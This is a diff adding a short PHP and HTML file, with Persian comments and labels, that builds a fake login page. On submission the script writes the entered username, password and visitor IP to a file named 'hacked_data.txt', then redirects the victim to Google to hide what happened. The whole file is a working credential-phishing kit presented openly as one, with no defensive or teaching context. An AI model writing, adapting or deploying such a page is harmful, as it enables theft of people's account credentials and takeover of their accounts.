@@ -1,0 +1,35 @@
+<?php
+// داده‌های دریافت شده را ذخیره کن
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+ $username = $_POST['username']; // یا email
+ $password = $_POST['password'];
+ 
+ // ذخیره در فایل متنی
+ $data = "User: $username | Pass: $password | IP: ". $_SERVER['REMOTE_ADDR']. "\n";
+ file_put_contents('hacked_data.txt', $data, FILE_APPEND);
+ 
+ // هدایت کاربر به صفحه اصلی واقعی (مثلا گوگل)
+ header("Location: https://www.google.com");
+ exit;
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Login</title>
+ <style>
+ body { font-family: Arial; text-align: center; padding-top: 50px; }
+ input { padding: 10px; margin: 10px; }
+ button { padding: 10px 20px; cursor: pointer; }
+ </style>
+</head>
+<body>
+ <h2>ورود به حساب کاربری</h2>
+ <!-- فرم ورود جعلی -->
+ <form method="post" action="">
+ <input type="text" name="username" placeholder="ایمیل یا نام کاربری" required><br>
+ <input type="password" name="password" placeholder="رمز عبور" required><br>
+ <button type="submit">ورود</button>
+ </form>
+</body>
+</html>
